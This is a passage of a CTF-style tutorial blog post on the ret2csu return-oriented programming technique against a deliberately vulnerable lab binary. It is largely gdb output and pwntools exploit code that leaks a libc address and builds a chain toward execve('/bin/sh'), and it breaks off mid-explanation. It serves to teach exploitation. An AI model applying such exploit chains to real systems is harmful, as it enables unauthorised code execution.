r14; pop r15; ret; 0x0000000000400690: pop r14; pop r15; ret; 0x0000000000400692: pop r15; ret; 0x00000000004005db: pop rax; ret; 0x000000000040052b: pop rbp; mov edi, 0x601040; jmp rax; 0x000000000040068b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 0x000000000040068f: pop rbp; pop r14; pop r15; ret; 0x0000000000400538: pop rbp; ret; 0x0000000000400693: pop rdi; ret; 0x0000000000400691: pop rsi; pop r15; ret; 0x000000000040068d: pop rsp; pop r13; pop r14; pop r15; ret; We have access to rdi, rsi but wait we don\u0026rsquo;t have rdx, (only if I added a pop rdx; ret instruction as well), that\u0026rsquo;s where ret2csu comes in. We have access to plenty of other registers like r12, r13, r14 and r15 which if you thought is useless, you gonna check the hidden power and access they have. Since ret2csu deals with __libc_csu_init, why don\u0026rsquo;t we check it\u0026rsquo;s code and know about that function itself? Let\u0026rsquo;s get started:-\nChecking the disassembly of the __libc_csu_init__ from the challenge binary:-\ngef➤ disas __libc_csu_init Dump of assembler code for function __libc_csu_init: 0x0000000000400630 \u0026lt;+0\u0026gt;:\tpush r15 0x0000000000400632 \u0026lt;+2\u0026gt;:\tpush r14 0x0000000000400634 \u0026lt;+4\u0026gt;:\tmov r15,rdx 0x0000000000400637 \u0026lt;+7\u0026gt;:\tpush r13 0x0000000000400639 \u0026lt;+9\u0026gt;:\tpush r12 0x000000000040063b \u0026lt;+11\u0026gt;:\tlea r12,[rip+0x2007ce] # 0x600e10 0x0000000000400642 \u0026lt;+18\u0026gt;:\tpush rbp 0x0000000000400643 \u0026lt;+19\u0026gt;:\tlea rbp,[rip+0x2007ce] # 0x600e18 0x000000000040064a \u0026lt;+26\u0026gt;:\tpush rbx 0x000000000040064b \u0026lt;+27\u0026gt;:\tmov r13d,edi 0x000000000040064e \u0026lt;+30\u0026gt;:\tmov r14,rsi 0x0000000000400651 \u0026lt;+33\u0026gt;:\tsub rbp,r12 0x0000000000400654 \u0026lt;+36\u0026gt;:\tsub rsp,0x8 0x0000000000400658 \u0026lt;+40\u0026gt;:\tsar rbp,0x3 0x000000000040065c \u0026lt;+44\u0026gt;:\tcall 0x400470 \u0026lt;_init\u0026gt; 0x0000000000400661 \u0026lt;+49\u0026gt;:\ttest rbp,rbp 0x0000000000400664 \u0026lt;+52\u0026gt;:\tje 0x400686 \u0026lt;__libc_csu_init+86\u0026gt; 0x0000000000400666 \u0026lt;+54\u0026gt;:\txor ebx,ebx 0x0000000000400668 \u0026lt;+56\u0026gt;:\tnop DWORD PTR [rax+rax*1+0x0] 0x0000000000400670 \u0026lt;+64\u0026gt;:\tmov rdx,r15 0x0000000000400673 \u0026lt;+67\u0026gt;:\tmov rsi,r14 0x0000000000400676 \u0026lt;+70\u0026gt;:\tmov edi,r13d 0x0000000000400679 \u0026lt;+73\u0026gt;:\tcall QWORD PTR [r12+rbx*8] 0x000000000040067d \u0026lt;+77\u0026gt;:\tadd rbx,0x1 0x0000000000400681 \u0026lt;+81\u0026gt;:\tcmp rbp,rbx 0x0000000000400684 \u0026lt;+84\u0026gt;:\tjne 0x400670 \u0026lt;__libc_csu_init+64\u0026gt; 0x0000000000400686 \u0026lt;+86\u0026gt;:\tadd rsp,0x8 0x000000000040068a \u0026lt;+90\u0026gt;:\tpop rbx 0x000000000040068b \u0026lt;+91\u0026gt;:\tpop rbp 0x000000000040068c \u0026lt;+92\u0026gt;:\tpop r12 0x000000000040068e \u0026lt;+94\u0026gt;:\tpop r13 0x0000000000400690 \u0026lt;+96\u0026gt;:\tpop r14 0x0000000000400692 \u0026lt;+98\u0026gt;:\tpop r15 0x0000000000400694 \u0026lt;+100\u0026gt;:\tret End of assembler dump. It is not that long, so we can get this in a minute or two completely, though there\u0026rsquo;s no point in understanding th whole workflow of the function so I\u0026rsquo;m going to take a look over the instructions which will be useful. Now, as you see the following lines:-\n0x0000000000400670 \u0026lt;+64\u0026gt;:\tmov rdx,r15 0x0000000000400673 \u0026lt;+67\u0026gt;:\tmov rsi,r14 0x0000000000400676 \u0026lt;+70\u0026gt;:\tmov edi,r13d This seems interesting, the contents of r13, r14 and r15 are going in edi, rsi and rdx respectively. Remember, we had access to r15 but not to rdx and the instruction at __libc_csu_init + 64 can move the content of r15 to rdx, that is the one we were looking for. But before start using these gadgets we need to understand what exactly is __libc_csu_init and it\u0026rsquo;s usage.\n__libc_csu_init #The __libc_csu_init is found in every binary, the purpose of this function is for initialization of functions and variables such that our binary is ready to use. From the libc source code, we can see:-\nint __libc_csu_init(int argc, char **argv, char **envp) { /* * Call all the __attribute__((constructor)) functions. * These symbols are generated by the linker. */ size_t num_init = __init_array_end - __init_array_start; for (size_t i = 0; i \u0026lt; num_init; i++) { __init_array_start[i](argc, argv, envp); } } In a nutshell, it calculates the difference between the __init_array\u0026rsquo;s start and end address which contains the functions, constructors, destructors, objects etc. which called at the time of initialization and hence, initialize them accordingly. I\u0026rsquo;m not covering much since the journey of how main is called from a binary would take it\u0026rsquo;s own post, for now this is the knowledge we need.\nNow, let\u0026rsquo;s break down the process of creating an exploit and cover it one by one. Let\u0026rsquo;s get started:-\nFinding offset to RIP #As usual, we need to know that exact how much bytes we need to give to the input in order to get the control of instruction pointer. Since we already used gets, we know that this program is vulnerable to buffer overflow, time to use gdb-gef\u0026rsquo;s pattern which will help us.\ngef➤ pattern create 200 [+] Generating a pattern of 200 bytes aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa [+] Saved as \u0026#39;$_gef0\u0026#39; gef➤ r Starting program: /tmp/ctf/pwn1/chall Welcome to the world of Pwning I\u0026#39;d like to know the name of brave warrior aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa As a token of appreciation, how about pwning me? Program received signal SIGSEGV, Segmentation fault. [ Legend: Modified register | Code | Heap | Stack | String ] ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: \u0026#34;chall\u0026#34;, stopped 0x4005d4 in vulnerable (), reason: SIGSEGV ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ──── [#0] 0x4005d4 → vulnerable() ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 0x00000000004005d4 in vulnerable () gef➤ x/xg $rsp 0x7fffffffde38:\t0x6161616161616166 gef➤ pattern search 0x6161616161616166 [+] Searching \u0026#39;0x6161616161616166\u0026#39; [+] Found at offset 40 (little-endian search) likely [+] Found at offset 33 (big-endian search) gef➤ Now, since we control over the RIP, time to use a .bss address to read string /bin/sh which we will be passed to first argument of execve later on.\nStoring /bin/sh at a .bss address #Since, we want to do execve(\u0026quot;/bin/sh\u0026quot;, 0, 0) but we don\u0026rsquo;t have any memory which already have /bin/sh address, so what we gonna do is pick an address from .bss section and store the string at that particular address. Now, let\u0026rsquo;s make a pwntools script to interact with binary and work with it, but firstly let\u0026rsquo;s pick a .bss address with the help of gdb.\ngef➤ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /tmp/ctf/pwn1/chall 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /tmp/ctf/pwn1/chall 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /tmp/ctf/pwn1/chall # I randomly picked an address from this range. gef➤ r Starting program: /tmp/ctf/pwn1/chall Welcome to the world of Pwning I\u0026#39;d like to know the name of brave warrior hello As a token of appreciation, how about pwning me? ^C Program received signal SIGINT, Interrupt. [ Legend: Modified register | Code | Heap | Stack | String ] Now, since we know that this binary contains a rw- data section, we will use it to store the /bin/sh at it. Let\u0026rsquo;s start interacting with binary and send payload:-\nfrom pwn import * elf = ELF(\u0026#34;chall\u0026#34;) p = process(\u0026#34;./chall\u0026#34;) payload = b\u0026#34;A\u0026#34;*40 # Offset to RIP payload += p64(0x0400693) # `pop rdi; ret` payload += p64(0x601150) # the `.bss` address` payload += p64(elf.plt[\u0026#39;gets\u0026#39;]) # PLT address of `gets` p.sendlineafter(b\u0026#34;warrior\\n\u0026#34;, \u0026#34;Robin\u0026#34;) pause() # This will allow the process to pause and then we debug it in `gdb` p.sendlineafter(b\u0026#34;me?\\n\u0026#34;, payload) p.interactive() Payload: The pop rdi; ret will pop the rdi register and we gave the .bss address right after it, after that we added the PLT address of gets, that means we are just doing gets(write_addr).\nLet\u0026rsquo;s run this script, after that we will attach it to gdb and check if the /bin/sh has been stored at that .bss address or not:-\n✘ d4mianwayne@oracle : /tmp/ctf/pwn1 $ python3 xpl.py [*] \u0026#39;/tmp/ctf/pwn1/chall\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process \u0026#39;./chall\u0026#39;: pid 23064 [*] Paused (press any to continue) Let\u0026rsquo;s attach this process to gdb:-\ngef➤ attach 23064 Attaching to program: /tmp/ctf/pwn1/chall, process 23064 Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libc-2.27.so...done. -- snip -- [#3] 0x7fb09f4e21fd → _IO_gets(buf=0x7ffdd9adead0 \u0026#34;\u0026#34;) [#4] 0x4005d2 → vulnerable() [#5] 0x400623 → main() ────────────────────────────────────────────────────────────────────────────────────────────────────────── 0x00007fb09f572081 in __GI___libc_read (fd=0x0, buf=0xca4670, nbytes=0x1000) at ../sysdeps/unix/sysv/linux/read.c:27 27\t../sysdeps/unix/sysv/linux/read.c: No such file or directory. Continuing the process, let\u0026rsquo;s enter the /bin/sh string:-\n[*] Switching to interactive mode $ /bin/sh Well, back to gdb:-\ngef➤ gef➤ c Continuing. Thread 1 \u0026#34;chall\u0026#34; received signal SIGSEGV, Segmentation fault. [ Legend: Modified register | Code | Heap | Stack | String ] -- snip -- ───────────────────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: \u0026#34;chall\u0026#34;, stopped 0x7ffdd9adec00 in ?? (), reason: SIGSEGV ─────────────────────────────────────────────────────────────────────────────────────────────── trace ──── [#0] 0x7ffdd9adec00 → add DWORD PTR [rax], eax ────────────────────────────────────────────────────────────────────────────────────────────────────────── 0x00007ffdd9adec00 in ?? () gef➤ x/s 0x601150 0x601150:\t\u0026#34;/bin/sh\u0026#34; Great, we stored the string \u0026quot;/bin/sh\u0026quot; at the 0x601150.\nThe ret2csu technique #We are finally at the main part of this blog post, this is where I will explain the technique very thoroughly, so be sure to pay attention. But, it is time for some code analysis of the gadgets we are going to use:-\ngef➤ disas __libc_csu_init Dump of assembler code for function __libc_csu_init: -- snip -- 0x0000000000400670 \u0026lt;+64\u0026gt;:\tmov rdx,r15 0x0000000000400673 \u0026lt;+67\u0026gt;:\tmov rsi,r14 0x0000000000400676 \u0026lt;+70\u0026gt;:\tmov edi,r13d 0x0000000000400679 \u0026lt;+73\u0026gt;:\tcall QWORD PTR [r12+rbx*8] 0x000000000040067d \u0026lt;+77\u0026gt;:\tadd rbx,0x1 0x0000000000400681 \u0026lt;+81\u0026gt;:\tcmp rbp,rbx 0x0000000000400684 \u0026lt;+84\u0026gt;:\tjne 0x400670 \u0026lt;__libc_csu_init+64\u0026gt; 0x0000000000400686 \u0026lt;+86\u0026gt;:\tadd rsp,0x8 0x000000000040068a \u0026lt;+90\u0026gt;:\tpop rbx 0x000000000040068b \u0026lt;+91\u0026gt;:\tpop rbp 0x000000000040068c \u0026lt;+92\u0026gt;:\tpop r12 0x000000000040068e \u0026lt;+94\u0026gt;:\tpop r13 0x0000000000400690 \u0026lt;+96\u0026gt;:\tpop r14 0x0000000000400692 \u0026lt;+98\u0026gt;:\tpop r15 0x0000000000400694 \u0026lt;+100\u0026gt;:\tret End of assembler dump. These are the instructions we are going to use, we have to break these gadgets in two parts so that we first fill up the registers like r12, r13 and others and after that the mov instructions will move the contents to the register we want it to. Let\u0026rsquo;s break the gadgets in 2 parts:-\n0x000000000040068a \u0026lt;+90\u0026gt;:\tpop rbx 0x000000000040068b \u0026lt;+91\u0026gt;:\tpop rbp 0x000000000040068c \u0026lt;+92\u0026gt;:\tpop r12 0x000000000040068e \u0026lt;+94\u0026gt;:\tpop r13 0x0000000000400690 \u0026lt;+96\u0026gt;:\tpop r14 0x0000000000400692 \u0026lt;+98\u0026gt;:\tpop r15 0x0000000000400694 \u0026lt;+100\u0026gt;:\tret This would be the first gadgets, first let\u0026rsquo;s work on using these and we will move to the other gadgets:-\nSince, r15\u0026rsquo;s content is going in rdx, r14\u0026rsquo;s content is going to rsi and r13d\u0026rsquo;s content is going to rdi. This means, we have to set the contents of these registers to /bin/sh, 0 and 0 respectively. Let\u0026rsquo;s work on:-\nNote: The d in r13d means the dword.\nThe second ROP gadget:-\n0x0000000000400670 \u0026lt;+64\u0026gt;:\tmov rdx,r15 0x0000000000400673 \u0026lt;+67\u0026gt;:\tmov rsi,r14 0x0000000000400676 \u0026lt;+70\u0026gt;:\tmov edi,r13d 0x0000000000400679 \u0026lt;+73\u0026gt;:\tcall QWORD PTR [r12+rbx*8] 0x000000000040067d \u0026lt;+77\u0026gt;:\tadd rbx,0x1 0x0000000000400681 \u0026lt;+81\u0026gt;:\tcmp rbp,rbx 0x0000000000400684 \u0026lt;+84\u0026gt;:\tjne 0x400670 \u0026lt;__libc_csu_init+64\u0026gt; 0x0000000000400686 \u0026lt;+86\u0026gt;:\tadd rsp,0x8 0x000000000040068a \u0026lt;+90\u0026gt;:\tpop rbx 0x000000000040068b \u0026lt;+91\u0026gt;:\tpop rbp 0x000000000040068c \u0026lt;+92\u0026gt;:\tpop r12 0x000000000040068e \u0026lt;+94\u0026gt;:\tpop r13 0x0000000000400690 \u0026lt;+96\u0026gt;:\tpop r14 0x0000000000400692 \u0026lt;+98\u0026gt;:\tpop r15 0x0000000000400694 \u0026lt;+100\u0026gt;:\tret For the second part, the one which will transfer the contents of r15, r14 and r13 to rdx, r14 to rsi and r13 to edi. But there are some problems, the instructions after those mov instructions need to be handled carefully such that if any one of the values in register, if wrong, would just discard everything. So, this is the important part, so focus on the explaination and work carefully.\nLet\u0026rsquo;s see how we will handle it, line by line:-\ncall QWORD PTR [r12+rbx*8] #This instruction calls a subroutine, now for this we may have to give up something which points to a function which is present in the binary and do not reference to an invalid address. To handle this, we will provide an address from Dynamic section of ELF such that the calling that function won\u0026rsquo;t do any change to the register content, as it should preserve the state of these registers, it also should not point to any an arbitrary address which will cause a breakthrough in the binary workflow. To meet this requirements, we will need either a _init or _fini to preserve the state of register:-\ngef➤ x/5xg \u0026amp;_DYNAMIC 0x600e20:\t0x0000000000000001\t0x0000000000000001 0x600e30:\t0x000000000000000c\t0x0000000000400470 0x600e40:\t0x000000000000000d gef➤ x/xg 0x600e30 0x600e30:\t0x000000000000000c gef➤ x/xg 0x600e34 0x600e34:\t0x0040047000000000 gef➤ x/xg 0x600e38 0x600e38:\t0x0000000000400470 gef➤ disas 0x0000000000400470 Dump of assembler code for function _init: 0x0000000000400470 \u0026lt;+0\u0026gt;:\tsub rsp,0x8 0x0000000000400474 \u0026lt;+4\u0026gt;:\tmov rax,QWORD PTR [rip+0x200b7d] # 0x600ff8 0x000000000040047b \u0026lt;+11\u0026gt;:\ttest rax,rax 0x000000000040047e \u0026lt;+14\u0026gt;:\tje 0x400482 \u0026lt;_init+18\u0026gt; 0x0000000000400480 \u0026lt;+16\u0026gt;:\tcall rax 0x0000000000400482 \u0026lt;+18\u0026gt;:\tadd rsp,0x8 0x0000000000400486 \u0026lt;+22\u0026gt;:\tret End of assembler dump. gef➤ 0x000000000040067d \u0026lt;+77\u0026gt;:\tadd rbx,0x1 #This will increment the value of value of rbx by 1.\n0x0000000000400681 \u0026lt;+81\u0026gt;:\tcmp rbp,rbx #This will compare the value of rbp with rbx.\n0x0000000000400684 \u0026lt;+84\u0026gt;:\tjne 0x400670 \u0026lt;__libc_csu_init+64\u0026gt; #This is a conditional jump, if the value of the cmp rbp, rbx is not equal, this means it\u0026rsquo;ll jump to the instruction stored at __libc_csu_init + 64.\n0x0000000000400686 \u0026lt;+86\u0026gt;:\tadd rsp,0x8 #This will add the 0x8 bytes and increase the size of the rsp by it.\nThe ROP Chain: Explanation #Now, let\u0026rsquo;s see exactly what is happening with the chain:-\n0x0000000000400670 \u0026lt;+64\u0026gt;:\tmov rdx,r15 0x0000000000400673 \u0026lt;+67\u0026gt;:\tmov rsi,r14 0x0000000000400676 \u0026lt;+70\u0026gt;:\tmov edi,r13d 0x0000000000400679 \u0026lt;+73\u0026gt;:\tcall QWORD PTR [r12+rbx*8] 0x000000000040067d \u0026lt;+77\u0026gt;:\tadd rbx,0x1 0x0000000000400681 \u0026lt;+81\u0026gt;:\tcmp rbp,rbx 0x0000000000400684 \u0026lt;+84\u0026gt;:\tjne 0x400670 \u0026lt;__libc_csu_init+64\u0026gt; 0x0000000000400686 \u0026lt;+86\u0026gt;:\tadd rsp,0x8 0x000000000040068a \u0026lt;+90\u0026gt;:\tpop rbx 0x000000000040068b \u0026lt;+91\u0026gt;:\tpop rbp 0x000000000040068c \u0026lt;+92\u0026gt;:\tpop r12 0x000000000040068e \u0026lt;+94\u0026gt;:\tpop r13 0x0000000000400690 \u0026lt;+96\u0026gt;:\tpop r14 0x0000000000400692 \u0026lt;+98\u0026gt;:\tpop r15 0x0000000000400694 \u0026lt;+100\u0026gt;:\tret Firstly, the lines with mov instruction are transferring the values of the registers of left operand to right operand. Then the call keyword is calling the subroutine calculated by at offset r12 + rbx * 8, and with the square brackets around them means the indirect addressing, this will make the call instruction to jump at that subroutine at the given address. Now, the add rbx, 1 will increment the value of rbx by 1. Then the value of rbp and rbx is compared, if they are not equal the RIP will be set to __libc_csu_init + 64. If it is equal, then the stack size will be increased by 8 and the registers rbx, rbp, r13, r14 and r14 will be popped.\nPayload: Part 1 #Now, since we are done with theoretical aspects of this technique, it\u0026rsquo;s time to try it practically. What we gonna do here is, chain the ROP chain from which we were able to input \u0026quot;/bin/sh\u0026quot;, and we are going to leak a GOT address in order to calculate the LIBC base address, then we will call main again.\nLet\u0026rsquo;s build a ROP chain:-\nSome prologue and predefined variables:-\nfrom pwn import * elf = ELF(\u0026#34;chall\u0026#34;) libc = elf.libc p = process(\u0026#34;./chall\u0026#34;) writable_address = 0x601150 # writale address pop_rdi = 0x400693 # pop rdi; ret; Enter the /bin/sh string to the wriitable address.\npayload = b\u0026#34;A\u0026#34;*40 # Padding to `RIP` register payload += p64(pop_rdi) # The `pop rdi; ret;`, this will wait for input payload += p64(writable_address) # The address is passed to `rdi` register payload += p64(elf.plt[\u0026#39;gets\u0026#39;]) # This will call the `gets` with it\u0026#39;s first argument as the writable address \u0026#39;\u0026#39;\u0026#39; gets(writable_address); \u0026#39;\u0026#39;\u0026#39; You know about what is happening here from earlier. Let\u0026rsquo;s move to other:-\npayload += p64(pop_rdi) # This will pop the `rdi` register which will wait for contents to be loaded in. payload += p64(elf.got[\u0026#39;puts\u0026#39;]) # This `GOT` address of `puts` will be given to `rdi` register, hence the first argument of puts payload += p64(elf.plt[\u0026#39;puts\u0026#39;]) # This will call `puts` with the `elf.got[\u0026#39;puts\u0026#39;]` This part is doing a bit of what is happening with the above part, the differnce is puts will print the value provided as first argument, here the GOT address will point to the LIBC address of the function which means it\u0026rsquo;ll print the address of puts from the LIBC.\nNow, let\u0026rsquo;s send the payload and parse the leaked LIBC address:-\npayload += p64(elf.symbols[\u0026#39;main\u0026#39;]) # This will shift the `RIP` to `main` function, hence calling the function again. p.sendlineafter(b\u0026#34;warrior\\n\u0026#34;, \u0026#34;Robin\u0026#34;) # This will be given to the first input program is asking for. p.sendlineafter(b\u0026#34;me?\\n\u0026#34;, payload) # Now, we will send the payload. p.sendline(\u0026#34;/bin/sh\\x00\u0026#34;) # The `/bin/sh` string is being sent such that it\u0026#39;d be stored to the writable address. leak = u64(p.recv(6).strip().ljust(8, b\u0026#34;\\x00\u0026#34;)) # Receiving the address and padding it such that it\u0026#39;ll be 8 bytes. libc.address = leak - libc.symbols[\u0026#39;puts\u0026#39;] # Subtracting the leaked address from the LIBC absolute address of `puts` will give us the base address. log.info(\u0026#34;puts@libc : \u0026#34; + hex(leak)) # Printing the leaked address. log.info(\u0026#34;libc : \u0026#34; + hex(libc.address)) # Printing the libc base address log.info(\u0026#34;\u0026#39;/bin/sh\u0026#39; : \u0026#34; + str(writable_address)) # Printing `/bin/sh` address. Let\u0026rsquo;s run the script and check it in gdb if we are on the right way or not:-\nd4mianwayne@oracle:~/pwn1$ python3 xpl.py [*] \u0026#39;/home/d4mianwayne/pwn1/chall\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [*] \u0026#39;/lib/x86_64-linux-gnu/libc-2.27.so\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process \u0026#39;./chall\u0026#39;: pid 14517 [*] Paused (press any to continue) Now, attach it to gdb:-\nd4mianwayne@oracle:~/pwn1$ gdb-gef -q chall Reading symbols from chall...(no debugging symbols found)...done. GEF for linux ready, type `gef\u0026#39; to start, `gef config\u0026#39; to configure 78 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6 [*] 2 commands could not be loaded, run `gef missing` to know why. gef➤ attach 14517 Attaching to program: /home/d4mianwayne/pwn1/chall, process 14517 Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libc-2.27.so...done. -- snip -- x/read.c:27 27\t../sysdeps/unix/sysv/linux/read.c: No such file or directory. Let\u0026rsquo;s continue the process with continue:-\ngef➤ continue Continuing. Now, resuming the script:-\nd4mianwayne@oracle:~/pwn1$ python3 xpl.py [*] \u0026#39;/home/d4mianwayne/pwn1/chall\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [*] \u0026#39;/lib/x86_64-linux-gnu/libc-2.27.so\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process \u0026#39;./chall\u0026#39;: pid 14517 [*] Paused (press any to continue) [*] puts@libc : 0x7effdfd759c0 [*] libc : 0x7effdfcf5000 [*] \u0026#39;/bin/sh\u0026#39; : 6295888 [*] Switching to interactive mode Welcome to the world of Pwning I\u0026#39;d like to know the name of brave warrior $ Welcome to the world of Pwning I\u0026#39;d like to know the name of brave warrior $ This is printed because we called the main again.\nNow, we will Interrupt the execution of program inside gdb to check if the address are correct:-\ngef➤ p puts $1 = {int (const char *)} 0x7effdfd759c0 \u0026lt;_IO_puts\u0026gt; gef➤ gef➤ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/d4mianwayne/pwn1/chall 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/d4mianwayne/pwn1/chall 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/d4mianwayne/pwn1/chall 0x0000000001987000 0x00000000019a8000 0x0000000000000000 rw- [heap] 0x00007effdfcf5000 0x00007effdfedc000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.27.so -- snip -- gef➤ x/s 6295888 0x601150:\t\u0026#34;/bin/sh\u0026#34; Awesome! Everything seems to be right. Now, we will go through second payload:-\nPayload: Part 2 #Now, this payload is crucial since this is where the actual ret2csu is, I\u0026rsquo;ll try to explain as much as I can:-\npayload = b\u0026#34;A\u0026#34;*40 # Padding to `RIP` register payload += p64(0x40068a) \u0026#39;\u0026#39;\u0026#39; 0x000000000040068a \u0026lt;+90\u0026gt;:\tpop rbx 0x000000000040068b \u0026lt;+91\u0026gt;:\tpop rbp 0x000000000040068c \u0026lt;+92\u0026gt;:\tpop r12 0x000000000040068e \u0026lt;+94\u0026gt;:\tpop r13 0x0000000000400690 \u0026lt;+96\u0026gt;:\tpop r14 0x0000000000400692 \u0026lt;+98\u0026gt;:\tpop r15 0x0000000000400694 \u0026lt;+100\u0026gt;:\tret \u0026#39;\u0026#39;\u0026#39; payload += p64(0x00) # Passed to `rbx` register payload += p64(0x01) # Passed to `rbp` payload += p64(0x600e38) # Passed to `r12` payload += p64(writable_address) # Passed to `r13` payload += p64(0x00) # Passed to `r14` payload += p64(0x00) # Passed to `r15` So, as you remember the following instructions:-\n0x0000000000400670 \u0026lt;+64\u0026gt;:\tmov rdx,r15 0x0000000000400673 \u0026lt;+67\u0026gt;:\tmov rsi,r14 0x0000000000400676 \u0026lt;+70\u0026gt;:\tmov edi,r13d That\u0026rsquo;s why we provided the value we wanted in rdx, rsi and rdi to r15, r14 and r13 respectively. The values passed to rbx and rbp have their importance when we call next chain. But first, let\u0026rsquo;s run the script and attach it to gdb such that we can check content registers:-\npayload += p64(0x00) # Passed to `rbx` register payload += p64(0x01) # Passed to `rbp` payload += p64(0x600e38) # Passed to `r12` payload += p64(writable_address) # Passed to `r13` payload += p64(0x00) # Passed to `r14` payload += p64(0x00) # Passed to `r15` p.sendlineafter(b\u0026#34;warrior\\n\u0026#34;, \u0026#34;Robin\u0026#34;) pause() p.sendlineafter(b\u0026#34;me?\\n\u0026#34;, payload) p.interactive() Since, you already know the drill of attaching and continuing the process in gdb, I\u0026rsquo;ll show the contents of registers:-\ngef➤ c Continuing. Thread 1 \u0026#34;chall\u0026#34; received signal SIGSEGV, Segmentation fault. [ Legend: Modified register | Code | Heap | Stack | String ] -- snip -- ───────────────────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: \u0026#34;chall\u0026#34;, stopped 0x7ffe1b95ba00 in ?? (), reason: SIGSEGV ─────────────────────────────────────────────────────────────────────────────────────────────── trace ──── [#0] 0x7ffe1b95ba00 → or BYTE PTR [rdx+0x7ffe1b95], bh ────────────────────────────────────────────────────────────────────────────────────────────────────────── 0x00007ffe1b95ba00 in ?? () The registers values:-\ngef➤ info registers rax 0x7ffe1b95b8e8\t0x7ffe1b95b8e8 rbx 0x0\t0x0 rcx 0x7fa7df2a7a00\t0x7fa7df2a7a00 rdx 0x7fa7df2a98d0\t0x7fa7df2a98d0 rsi 0x1324671\t0x1324671 rdi 0x7ffe1b95b8e9\t0x7ffe1b95b8e9 rbp 0x1\t0x1 rsp 0x7ffe1b95b950\t0x7ffe1b95b950 r8 0x13246d1\t0x13246d1 r9 0x7fa7df2a98d0\t0x7fa7df2a98d0 r10 0x7fa7df4b74c0\t0x7fa7df4b74c0 r11 0x246\t0x246 r12 0x600e38\t0x600e38 r13 0x601150\t0x601150 r14 0x0\t0x0 r15 0x0\t0x0 rip 0x7ffe1b95ba00\t0x7ffe1b95ba00 eflags 0x10246\t[ PF ZF IF RF ] cs 0x33\t0x33 ss 0x2b\t0x2b ds 0x0\t0x0 es 0x0\t0x0 fs 0x0\t0x0 gs 0x0\t0x0 gef➤ x/s 0x601150 0x601150:\t\u0026#34;/bin/sh\u0026#34; Now, it\u0026rsquo;s time to check the second ROP chain:-\n\u0026#39;\u0026#39;\u0026#39; 0x0000000000400670 \u0026lt;+64\u0026gt;:\tmov rdx,r15 0x0000000000400673 \u0026lt;+67\u0026gt;:\tmov rsi,r14 0x0000000000400676 \u0026lt;+70\u0026gt;:\tmov edi,r13d 0x0000000000400679 \u0026lt;+73\u0026gt;:\tcall QWORD PTR [r12+rbx*8] 0x000000000040067d \u0026lt;+77\u0026gt;:\tadd rbx,0x1 0x0000000000400681 \u0026lt;+81\u0026gt;:\tcmp rbp,rbx 0x0000000000400684 \u0026lt;+84\u0026gt;:\tjne 0x400670 \u0026lt;__libc_csu_init+64\u0026gt; 0x0000000000400686 \u0026lt;+86\u0026gt;:\tadd rsp,0x8 0x000000000040068a \u0026lt;+90\u0026gt;:\tpop rbx 0x000000000040068b \u0026lt;+91\u0026gt;:\tpop rbp 0x000000000040068c \u0026lt;+92\u0026gt;:\tpop r12 0x000000000040068e \u0026lt;+94\u0026gt;:\tpop r13 0x0000000000400690 \u0026lt;+96\u0026gt;:\tpop r14 0x0000000000400692 \u0026lt;+98\u0026gt;:\tpop r15 0x0000000000400694 \u0026lt;+100\u0026gt;:\tret \u0026#39;\u0026#39;\u0026#39; payload += p64(0x00) # add rsp,0x8 padding payload += p64(0x00) # rbx payload += p64(0x00) # rbp payload += p64(0x00) # r12 payload += p64(0x00) # r13 payload += p64(0x00) # r14 payload += p64(0x00) # r15 payload += p64(libc.symbols[\u0026#39;execve\u0026#39;]) Well, kind of a long chain to deal with but it\u0026rsquo;s very simple, as I already explained it but this time we are giving the input, so this is a crucial part. The explanations would be done line by line:-\n0x0000000000400670 \u0026lt;+64\u0026gt;:\tmov rdx,r15 0x0000000000400673 \u0026lt;+67\u0026gt;:\tmov rsi,r14 0x0000000000400676 \u0026lt;+70\u0026gt;:\tmov edi,r13d 0x0000000000400679 \u0026lt;+73\u0026gt;:\tcall QWORD PTR [r12+rbx*8] 0x000000000040067d \u0026lt;+77\u0026gt;:\tadd rbx,0x1 0x0000000000400681 \u0026lt;+81\u0026gt;:\tcmp rbp,rbx 